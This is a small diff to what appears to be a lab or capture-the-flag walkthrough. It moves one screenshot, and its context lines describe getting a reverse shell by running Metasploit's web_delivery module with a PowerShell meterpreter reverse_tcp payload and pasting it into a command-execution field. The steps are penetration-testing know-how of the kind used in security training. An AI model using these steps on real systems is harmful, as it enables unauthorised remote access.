@@ -22,12 +22,14 @@ execute any command this allows us to gain reverse shell. Download the powershel
 
 ![screenshot](images/exec.png)
 
+![screenshot](images/payload.png)
+
 ![screenshot](images/revs.png)
 
 ## 4. Gaining shell
 Run msfconsole and `use exploit/multi/script/web_delivery`. Then run `set exploit 2` to target powershell Then run `set payload windows/meterpreter/reverse_tcp` to change target platform to windows. Fill in your ip and the port you want to listen to then paste the generated payload into the configure textbox that allows us to run command. This should spawn a meterpreter
 
-![screenshot](images/payload.png)
+
 
 ![screenshot](images/meter.png)
 
